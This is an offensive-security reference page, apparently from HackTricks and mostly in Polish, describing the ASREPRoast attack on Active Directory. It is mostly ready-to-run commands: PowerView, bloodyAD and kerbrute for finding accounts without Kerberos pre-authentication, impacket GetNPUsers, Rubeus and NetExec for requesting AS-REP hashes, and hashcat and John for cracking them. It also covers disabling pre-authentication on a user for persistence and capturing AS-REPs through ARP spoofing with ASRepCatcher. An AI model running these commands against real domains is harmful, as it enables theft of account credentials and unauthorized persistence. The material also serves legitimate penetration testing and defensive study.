# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast to atak bezpieczeństwa, który wykorzystuje użytkowników nieposiadających atrybutu **Kerberos pre-authentication required**. W praktyce ta podatność pozwala atakującym żądać uwierzytelnienia dla użytkownika od Domain Controller (DC) bez potrzeby znajomości hasła użytkownika. DC następnie odpowiada wiadomością zaszyfrowaną kluczem pochodzącym z hasła użytkownika, którą atakujący mogą spróbować złamać offline, aby poznać hasło użytkownika.

Główne wymagania dla tego ataku to:

- **Brak Kerberos pre-authentication**: Docelowi użytkownicy nie mogą mieć włączonej tej funkcji bezpieczeństwa.
- **Połączenie z Domain Controller (DC)**: Atakujący potrzebują dostępu do DC, aby wysyłać żądania i odbierać zaszyfrowane wiadomości.
- **Opcjonalne domain account**: Posiadanie domain account pozwala atakującym skuteczniej identyfikować podatnych użytkowników przez zapytania LDAP. Bez takiego konta atakujący muszą zgadywać usernames.

#### Enumerating vulnerable users (need domain credentials)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Żądanie wiadomości AS_REP
```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> Rubeus requests **RC4** by default, so Event ID **4768** usually shows **preauth type 0** and **ticket encryption type 0x17**. If you add **`/aes`** (or RC4 is disabled for the target), expect **AES etypes** instead.

#### Quick one-liners (Linux)

- Enumerate potential targets first (e.g., from leaked build paths) with Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Roast a whole username list without valid creds using NetExec: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`
- If you do have creds, let NetExec query LDAP and request every roastable account for you: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`
- If the output starts with **`$krb5asrep$23$`**, crack it with Hashcat **`-m 18200`**. If it starts with **`$krb5asrep$17$`** or **`$krb5asrep$18$`**, prefer John **`--format=krb5asrep`**.

### Cracking

Don't assume every AS-REP roast is RC4. Modern tooling can return **RC4** (`$krb5asrep$23$`) or **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`) depending on the requested/negotiated enctype. **`hashcat -m 18200`** is for **etype 23**, while **John** handles `krb5asrep` directly for **17/18/23**.
```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```
### Persistence

Wymuś, że **preauth** nie jest wymagane dla użytkownika, dla którego masz uprawnienia **GenericAll** (lub uprawnienia do zapisu właściwości):
```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast bez poświadczeń

Atakujący może wykorzystać pozycję man-in-the-middle do przechwytywania pakietów AS-REP podczas ich przesyłania przez sieć, bez polegania na wyłączonym Kerberos pre-authentication. Dlatego działa to dla wszystkich użytkowników w VLAN.\
Jeśli chcesz powiązaną sztuczkę no-credential, która zwraca **service ticket** zamiast **TGT** z principal bez preauth, zobacz [Kerberoast](kerberoast.md).

[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) pozwala nam to zrobić. Tryb `relay` jest ofensywnie najciekawszy, ponieważ może wymusić **RC4**, gdy klient nadal reklamuje **etype 23**; `listen` pozostaje pasywny i po prostu przechwytuje to, co uzgodnił klient/DC.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Referencje

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
